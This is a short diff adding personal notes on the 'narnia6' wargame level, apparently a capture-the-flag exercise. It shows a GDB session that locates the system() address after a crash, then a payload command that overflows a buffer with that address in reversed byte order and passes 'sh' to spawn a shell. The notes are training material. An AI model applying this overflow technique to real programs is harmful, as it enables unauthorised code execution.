@@ -1,0 +1,10 @@
+# GDB Debuging
+(gdb): run `python -c "print('a'*9)"` a
+...sigfault...
+(gdb): print
+$1 = (<text variable, no debug info> *) 0xf7e4c850 <system>
+...
+system_address = b'\xf7\xe4\xc8\x50'
+...
+# Prepare payload
+./narnia6 `python -c "print('aaaaaaaa'+'\xf7\xe4\xc8\x50'[-1::-1])"` aaaaaaaash
